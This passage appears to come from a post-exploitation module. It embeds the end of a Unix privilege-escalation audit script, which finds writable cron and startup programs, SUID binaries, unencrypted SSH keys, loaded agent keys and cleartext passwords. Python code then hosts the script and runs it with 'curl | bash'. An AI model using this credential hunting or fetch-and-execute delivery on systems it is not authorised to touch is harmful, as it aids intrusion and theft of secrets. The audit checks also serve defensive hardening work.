    echo "Processing crontab entry: $LINE"
    USER=`echo "$LINE" | awk '{print $6}'`
    PROG=`echo "$LINE" | sed 's/(//' | awk '{print $7}'`
    check_called_programs "$PROG is run from crontab as $USER." $PROG $USER $MYPATH
  done
else
  echo "File /etc/crontab not present.  Skipping checks."
fi
if [ -n "$CRONDIRS" ]; then
  USER=`echo "$CRONDIRS" | awk '{print $6}'`
  section "Checking /etc/cron.(hourly|daily|weekly|monthly)"
  for DIR in hourly daily weekly monthly; do
    if [ -d "/etc/cron.$DIR" ]; then
      echo "    Checking directory: /etc/cron.$DIR"
      for FILE in /etc/cron.$DIR/*; do
        FILENAME=`echo "$FILE" | sed 's/.*\\///'`
        if [ "$FILENAME" = "*" ]; then 
          echo "No files in this directory."
          continue
        fi
        check_called_programs "$FILE is run via cron as $USER." "$FILE" $USER
      done
    fi
  done
fi
section "Checking cron job programs aren't writable (/var/spool/cron/crontabs)"
if [ -d "/var/spool/cron/crontabs" ]; then
  for FILE in /var/spool/cron/crontabs/*; do 
    USER=`echo "$FILE" | sed 's/^.*\\///'`
    if [ "$USER" = "*" ]; then
      echo "No user crontabs found in /var/spool/cron/crontabs.  Skipping checks."
      continue
    fi
    echo "Processing crontab for $USER: $FILE"
    if [ -r "$FILE" ]; then
      MYPATH=`grep '^PATH=' "$FILE" | cut -f 2 -d = `
      if [ -n "$MYPATH" ]; then
        echo Crontab path is $MYPATH
      fi
      grep -v '^#' "$FILE" | grep -v '^[ \\t]*$' | grep '[ \\t][^ \\t][^ \\t]*[ \\t][ \\t]*' | while read LINE
      do 
        echo "Processing crontab entry: $LINE"
        PROG=`echo "$LINE" | sed 's/(//' | awk '{print $6}'`
        check_called_programs "$PROG is run via cron as $USER." "$PROG" $USER
      done
    else
      echo "ERROR: Can't read file $FILE"
    fi
  done
else
  echo "Directory /var/spool/cron/crontabs is not present.  Skipping checks."
fi
section "Checking cron job programs aren't writable (/var/spool/cron/tabs)"
if [ -d "/var/spool/cron/tabs" ]; then
  for FILE in /var/spool/cron/tabs/*; do 
    USER=`echo "$FILE" | sed 's/^.*\\///'`
    if [ "$USER" = "*" ]; then
      echo "No user crontabs found in /var/spool/cron/crontabs.  Skipping checks."
      continue
    fi
    echo "Processing crontab for $USER: $FILE"
    if [ -r "$FILE" ]; then
      MYPATH=`grep '^PATH=' "$FILE" | cut -f 2 -d = `
      if [ -n "$MYPATH" ]; then
        echo Crontab path is $MYPATH
      fi
      grep -v '^#' "$FILE" | grep -v '^[ \\t]*$' | grep '[ \\t][^ \\t][^ \\t]*[ \\t][ \\t]*' | while read LINE
      do 
        echo "Processing crontab entry: $LINE"
        PROG=`echo "$LINE" | sed 's/(//' | awk '{print $6}'`
        check_called_programs "$PROG is run from cron as $USER." $PROG $USER $MYPATH
      done
    else
      echo "ERROR: Can't read file $FILE"
    fi
  done
else
  echo "Directory /var/spool/cron/tabs is not present.  Skipping checks."
fi
section "Checking inetd programs aren't writable"
if [ -f /etc/inetd.conf ] && [ -r /etc/inetd.conf ]; then
  grep -v '^#' /etc/inetd.conf | grep -v '^[ \\t]*$' | while read LINE
  do 
    USER=`echo $LINE | awk '{print $5}'`
    PROG=`echo $LINE | awk '{print $6}'`  # could be tcpwappers ...
    PROG2=`echo $LINE | awk '{print $7}'` # ... and this is the real prog
    if [ -z "$PROG" ] || [ "$PROG" = "internal" ]; then
      continue
    fi
    echo Processing inetd line: $LINE
    if [ -f "$PROG" ]; then
      check_called_programs "$PROG is run from inetd as $USER." $PROG $USER
    fi
    if [ -f "$PROG2" ]; then
      check_called_programs "$PROG is run from inetd as $USER." $PROG2 $USER
    fi
  done
else
  echo "File /etc/inetd.conf not present.  Skipping checks."
fi
section "Checking xinetd programs aren't writeable"
if [ -d /etc/xinetd.d ]; then
  for FILE in `grep 'disable[ \\t]*=[ \\t]*no' /etc/xinetd.d/* | cut -f 1 -d :`; do
    echo Processing xinetd service file: $FILE
    PROG=`grep '^[ \\t]*server[ \\t]*=[ \\t]*' $FILE | sed 's/.*server.*=[ \\t]*//'`
    USER=`grep '^[ \\t]*user[ \\t]*=[ \\t]*' $FILE | sed 's/.*user.*=[ \\t]*//'`
    check_called_programs "$PROG is run from xinetd as $USER." $PROG $USER
  done
else
  echo "Directory /etc/xinetd.d not present.  Skipping checks."
fi
section "Checking home directories aren't writable"
cat /etc/passwd | grep -v '^#' | while read LINE
do
  echo Processing /etc/passwd line: $LINE
  USER=`echo $LINE | cut -f 1 -d :`
  DIR=`echo $LINE | cut -f 6 -d :`
  SHELL=`echo $LINE | cut -f 7 -d :`
  if [ "$SHELL" = "/sbin/nologin" ] || [ "$SHELL" = "/bin/false" ]; then
    echo "    Skipping user $USER.  They don't have a shell."
  else
    if [ "$DIR" = "/dev/null" ]; then
      echo "    Skipping /dev/null home directory"
    else
      check_perms "$DIR is the home directory of $USER." $DIR $USER
    fi
  fi
done
section "Checking for readable sensitive files in home directories"
cat /etc/passwd | while read LINE
do
  USER=`echo $LINE | cut -f 1 -d :`
  DIR=`echo $LINE | cut -f 6 -d :`
  SHELL=`echo $LINE | cut -f 7 -d :`
  for FILE in $HOME_DIR_FILES; do
    if [ -f "$DIR/$FILE" ]; then
      check_read_perms "$DIR/$FILE is in the home directory of $USER." "$DIR/$FILE" $USER 
    fi
  done
done
section "Checking SUID/SGID programs"
if [ "$MODE" = "detailed" ]; then
  for FILE in `find / -type f -perm -04000 -o -type f -perm -02000 2>/dev/null`; do
    check_called_programs_suid_sgid $FILE
    SUIDDCRIPT=`file $FILE | grep script`
    if [ -n "$SUIDSCRIPT" ]; then
      echo "[UPC023] WARNING: SetUID/SetGID shell script, may be vulnerable to race attacks"
    fi
  done
else
  echo "Skipping checks of SUID/SGID programs (it's slow!).  Run again in 'detailed' mode."
fi
section "Checking fscaps programs"
if [ "$OS" = "linux" -a -x /sbin/getcap ]; then
  if [ "$MODE" = "detailed" ]; then
    for FILE in `find / -type f -perm +0011 -exec /sbin/getcap {} \\; 2>/dev/null | grep "=" | awk '{print $1}'`; do
      /sbin/getcap $FILE
      check_called_programs_fscaps $FILE
      FSCAPSSCRIPT=`file $FILE | grep script`
      if [ -n "$FSCAPSSCRIPT" ]; then
        echo "[UPC043] WARNING: fscaps shell script, may be vulnerable to race attacks"
      fi
    done
  else
    echo "Skipping checks of fscaps programs (it's slow!).  Run again in 'detailed' mode."
  fi
fi
section "Checking for cleartext subversion passwords in home directories"
for HOMEDIR in `cut -f 6 -d : /etc/passwd`; do 
  if [ -d "$HOMEDIR/.subversion/auth/svn.simple" ]; then 
    for FILE in $HOMEDIR/.subversion/auth/svn.simple/*; do
      echo "[UPC024] WARNING: Cleartext subversion passsword file: $FILE"
    done
  fi  
done
section "Checking for Private SSH Keys in home directories"
for HOMEDIR in `cut -f 6 -d : /etc/passwd`; do 
  if [ -d "$HOMEDIR/.ssh" ]; then 
    PRIV_KEYS=`grep -l 'BEGIN [RD]SA PRIVATE KEY' $HOMEDIR/.ssh/* 2>/dev/null`
    if [ -n "$PRIV_KEYS" ]; then 
      for KEY in $PRIV_KEYS; do
        ENC_KEY=`grep -l 'ENCRYPTED' "$KEY" 2>/dev/null`
        if [ -n "$ENC_KEY" ]; then
          echo "[UPC025] WARNING: Encrypted private SSH key found in $KEY"
        else
          echo "[UPC026] WARNING: Unencrypted private SSH key found in $KEY"
        fi
      done
    fi
  fi  
done
section "Checking for Public SSH Keys in home directories"
for HOMEDIR in `cut -f 6 -d : /etc/passwd`; do 
  if [ -r "$HOMEDIR/.ssh/authorized_keys" ]; then 
    KEYS=`grep '^ssh-' $HOMEDIR/.ssh/authorized_keys 2>/dev/null`
    if [ -n "$KEYS" ]; then 
      echo "[UPC027] WARNING: Public SSH Key Found in $HOMEDIR/.ssh/authorized_keys"
    fi
  fi  
done
section "Checking classpath permissions for Java processes"
ps -ef | grep -i '\\-classpath' | grep -v grep | while read LINE
do
  U=`echo $LINE | awk '{print $1}'`
  CLASSPATH=`echo $LINE | sed 's/.*classpath //' | sed 's/ .*//'`
  for P in `echo $CLASSPATH | sed 's/:/ /g'`; do
    check_perms "$P is in the classpath for a java process run by $U." "$P" $U
  done
done
section "Checking for SSH agents"
AGENTS=`ps -ef | grep ssh-agent | grep -v grep`
if [ -n "$AGENTS" ]; then
  echo "[UPC028] WARNING: There are SSH agents running on this system:"
  ps -ef | grep ssh-agent | grep -v grep
  for SOCK in `ls /tmp/ssh-*/agent.* 2>/dev/null`; do
    SSH_AUTH_SOCK=$SOCK; export SSH_AUTH_SOCK
    AGENT_KEYS=`ssh-add -l | grep -v 'agent has no identities.' 2>/dev/null`
    if [ -n "$AGENT_KEYS" ]; then
      echo "[UPC029] WARNING: SSH Agent has keys loaded [SSH_AUTH_SOCK=$SSH_AUTH_SOCK]"
      ssh-add -l
    fi
  done
else
  echo "No SSH agents found"
fi
section "Checking for GPG agents"
AGENTS=`ps -ef | grep gpg-agent | grep -v grep`
if [ -n "$AGENTS" ]; then
  echo "[UPC030] WARNING: There are GPG agents running on this system:"
  ps aux | grep gpg-agent | grep -v grep
else
  echo "No GPG agents found"
fi
section "Checking startup files (init.d / rc.d) aren't writable"
for DIR in /etc/init.d /etc/rc.d /usr/local/etc/rc.d; do
  if [ -d "$DIR" ]; then
    for FILE in $DIR/*; do
                  F=`echo "$FILE" | sed 's/^.*\\///'`
                  if [ "$F" = "*" ]; then
                          echo "No user startup script found in $DIR.  Skipping checks."
                          continue
                  fi
      echo Processing startup script $FILE
      check_called_programs "$FILE is run by root at startup." $FILE root
    done
  fi
done
section "Checking if running programs are writable"
if [ "$OS" = "solaris" ]; then
  ps -ef -o user,comm | while read LINE
  do
    USER=`echo "$LINE" | awk '{print $1}'`
    PROG=`echo "$LINE" | awk '{print $2}'`
    check_called_programs "$PROG is currently running as $USER." "$PROG" "$USER"
  done
elif [ "$OS" = "aix" ]; then
  ps -ef -o user,comm | while read LINE
  do
    USER=`echo "$LINE" | awk '{print $1}'`
    PROG=`echo "$LINE" | awk '{print $2}'`
    check_called_programs "`which $PROG` is currently running as $USER." "`which $PROG`" "$USER"
  done
elif [ "$OS" = "bsd" ]; then
  ps aux | while read LINE
  do
    USER=`echo "$LINE" | awk '{print $1}'`
    PROG=`echo "$LINE" | awk '{print $11}'`
    check_called_programs "$PROG is currently running as $USER." "$PROG" "$USER"
  done
elif [ "$OS" = "hpux" ]; then
  ps -ef | while read LINE
  do
    USER=`echo "$LINE" | awk '{print $1}'`
    PROG1=`echo "$LINE" | awk '{print $8}'`
    PROG2=`echo "$LINE" | awk '{print $9}'`
    if [ -f "$PROG1" ]; then
      check_called_programs "$PROG is currently running as $USER." "$PROG1" "$USER"
    fi
    if [ -f "$PROG2" ]; then
      check_called_programs "$PROG is currently running as $USER." "$PROG2" "$USER"
    fi
  done
elif [ "$OS" = "linux" ]; then
  for PROCDIR in /proc/[0-9]*; do
    unset PROGPATH
    PID=`echo $PROCDIR | cut -f 3 -d /`
    echo ------------------------
    echo "PID:           $PID"
    if [ -d "$PROCDIR" ]; then
      if [ -r "$PROCDIR/exe" ]; then
        PROGPATH=`ls -l "$PROCDIR/exe" 2>&1 | sed 's/ (deleted)//' | awk '{print $NF}'`
      else
        if [ -r "$PROCDIR/cmdline" ]; then
          P=`cat $PROCDIR/cmdline | tr "\\0" = | cut -f 1 -d = | grep '^/'`
          if [ -z "$P" ]; then
            echo "ERROR: Can't find full path of running program: "`cat $PROCDIR/cmdline`
          else
            PROGPATH=$P
          fi
        else
          echo "ERROR: Can't find full path of running program: "`cat $PROCDIR/cmdline`
          continue
        fi
      fi
      get_owner $PROCDIR; OWNER=$GET_OWNER_RETURN
      echo "Owner:         $OWNER"
    else
      echo "ERROR: Can't find OWNER.  Process has gone."
      continue
    fi
    if [ -n "$PROGPATH" ]; then
      get_owner $PROGPATH; PROGOWNER=$GET_OWNER_RETURN
      echo "Program path:  $PROGPATH"
      check_called_programs "$PROGPATH is currently running as $OWNER." $PROGPATH $OWNER
    fi
    if [ "$MODE" = "detailed" ]; then
      for FILE in $PROCDIR/fd/*; do
                    F=`echo "$FILE" | sed 's/^.*\\///'`
                    if [ "$F" = "*" ]; then
                            continue
                    fi
        check_perms "$FILE is an open file descriptor for process $PID running as $OWNER." $FILE $OWNER
      done
    fi
  done
fi
section "Checking exploit mitigation"
if [ "$MODE" = "detailed" ]; then
  if [ "$OS" = "solaris" ]; then
    NX=`grep noexec_user_stack /etc/system | grep -v _log | grep 1`
    if [ -z "$NX" ]; then
      echo "[UPC031] WARNING: No NX"
    fi
    NXLOG=`grep noexec_user_stack_log /etc/system | grep 1`
    if [ -z "$NXLOG" ]; then
      echo "[UPC032] WARNING: No NX logging"
    fi
    AUDIT=`grep c2audit:audit_load /etc/system | grep 1`
    if [ -z "$AUDIT" ]; then
      echo "[UPC033] WARNING: Auditing not enabled"
    fi
  fi
  if [ "$OS" = "aix" ]; then
    false
  fi
  if [ "$OS" = "hpux" ]; then
    NX=`kmtune -q executable_stack | grep executable_stack | awk '{print $2}'`
    if [ "$NX" -eq 1 ]; then
      echo "[UPC034] WARNING: No NX"
    elif [ "$NX" -eq 2 ]; then
      echo "[UPC035] WARNING: NX set to logging only"
    fi
  fi
  if [ "$OS" = "linux" ]; then
    ASLR=`sysctl kernel.randomize_va_space | awk '{print $3}'`
    if [ "$ASLR" -eq 0 ]; then
      echo "[UPC036] WARNING: No ASLR"
    elif [ "$ASLR" -eq 1 ]; then
      echo "[UPC037] WARNING: Conservative ASLR"
    fi
    MMAP=`cat /proc/sys/vm/mmap_min_addr`
    if [ "$MMAP" -eq 0 -o "$MMAP" = "" ]; then
      echo "[UPC038] WARNING: mmap allows map to 0"
    fi
    if [ ! -f /selinux/enforce ]; then
      echo "[UPC039] WARNING: SELinux does not enforce"
    fi
    for PROCDIR in /proc/[0-9]*; do
      unset PROGPATH
      PID=`echo $PROCDIR | cut -f 3 -d /`
      echo ------------------------
      echo "PID:           $PID"
      if [ -d "$PROCDIR" ]; then
        if [ -r "$PROCDIR/exe" ]; then
          PROGPATH=`ls -l "$PROCDIR/exe" 2>&1 | sed 's/ (deleted)//' | awk '{print $NF}'`
        else
          if [ -r "$PROCDIR/cmdline" ]; then
            P=`cat $PROCDIR/cmdline | tr "\\0" = | cut -f 1 -d = | grep '^/'`
            if [ -z "$P" ]; then
              echo "ERROR: Can't find full path of running program: "`cat $PROCDIR/cmdline`
            else
              PROGPATH=$P
            fi
          else
            echo "ERROR: Can't find full path of running program: "`cat $PROCDIR/cmdline`
            continue
          fi
        fi
      else
        echo "ERROR: Can't find full path of running process.  Process has gone."
        continue
      fi
      if [ -n "$PROGPATH" ]; then
        echo "Program path: $PROGPATH"
        NX=`grep stack $PROCDIR/maps | grep -v "rw-"`
        if [ -n "$NX" ]; then
          echo "[UPC040] WARNING: NX not enabled"
        fi
        SSP=`objdump -D $PROCDIR/exe | grep stack_chk`
        if [ -z "$SSP" ]; then
          echo "[UPC041] WARNING: SSP not enabled"
        fi
      fi
    done
    find / \\( -perm -u+s -o -perm -g+s \\) -type f | while read PROGPATH; do
      echo "Program path: $PROGPATH"
      ls -la $PROGPATH
      SSP=`objdump -D $PROGPATH | grep stack_chk`
      if [ -z "$SSP" ]; then
        echo "[UPC042] WARNING: SSP not enabled"
      fi
    done
    find / -type f -exec /sbin/getcap {} \\; 2>/dev/null | grep "=" | awk '{print $1}' | while read PROGPATH; do
      echo "Program path: $PROGPATH"
      /sbin/getcap $PROGPATH
      SSP=`objdump -D $PROGPATH | grep stack_chk`
      if [ -z "$SSP" ]; then
        echo "[UPC042] WARNING: SSP not enabled"
      fi
    done
  fi
fi
'''
ip = "%s"
port = %s
serveCount = %s
try:
  start_webserver(data, ip, port, serveCount)
except Exception as e:
  pass
try:
  process = subprocess.Popen('curl -s %s | bash -s %s 2> /dev/null', stdout=subprocess.PIPE, shell=True)
  result = process.communicate()
  result = result[0].strip()
  print result
except Exception as e:
  print e
        """ %(ip,port,serveCount,url,privSetting)
        return script